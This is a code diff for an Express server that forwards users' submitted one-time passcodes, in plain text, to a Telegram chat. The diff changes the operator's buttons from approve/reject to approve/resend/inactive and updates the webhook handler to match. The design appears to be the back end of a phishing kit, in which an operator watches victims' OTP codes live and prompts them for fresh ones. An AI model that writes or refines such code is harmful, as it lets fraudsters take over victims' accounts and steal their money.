@@ -143,8 +143,9 @@ app.post('/api/submit-otp', async (req, res) => {
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: "✅ APPROVE OTP", callback_data: `approve_otp_${appId}` },
-                            { text: "❌ REJECT OTP", callback_data: `reject_otp_${appId}` }
+                            { text: "✅ APPROVE", callback_data: `approve_otp_${appId}` },
+                            { text: "🔄 RESEND", callback_data: `resend_otp_${appId}` },
+                            { text: "🚫 INACTIVE", callback_data: `inactive_otp_${appId}` }
                         ]
                     ]
                 }
@@ -179,17 +180,17 @@ app.post('/api/telegram-webhook', async (req, res) => {
         // Parse the callback data properly
         let action, appId, target;
         if (data.includes('sms_')) {
-            const parts = data.split('_'); // e.g., ['approve', 'sms', '12345']
+            const parts = data.split('_'); 
             action = parts[0];
             target = parts[1];
             appId = parts[2];
         } else if (data.includes('otp_')) {
-            const parts = data.split('_'); // e.g., ['approve', 'otp', '12345']
+            const parts = data.split('_'); 
             action = parts[0];
             target = parts[1];
             appId = parts[2];
         } else {
-            const parts = data.split('_'); // e.g., ['approve', '12345']
+            const parts = data.split('_'); 
             action = parts[0];
             appId = parts[1];
         }
@@ -241,13 +242,20 @@ app.post('/api/telegram-webhook', async (req, res) => {
                               `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
                               `Status: ✅ *OTP APPROVED*`;
                     newStatus = "OTP Approved!";
-                } else {
-                    applications[appId].otpStatus = 'rejected';
+                } else if (action === 'resend') {
+                    applications[appId].otpStatus = 'resend';
                     newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
                               `*App ID:* \`${appId}\`\n` +
                               `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
-                              `Status: ❌ *OTP REJECTED*`;
-                    newStatus = "OTP Rejected!";
+                              `Status: 🔄 *RESEND REQUESTED*`;
+                    newStatus = "Resend Requested!";
+                } else if (action === 'inactive') {
+                    applications[appId].otpStatus = 'inactive';
+                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
+                              `*App ID:* \`${appId}\`\n` +
+                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
+                              `Status: 🚫 *ACCOUNT INACTIVE*`;
+                    newStatus = "Marked Inactive!";
                 }
             }
 
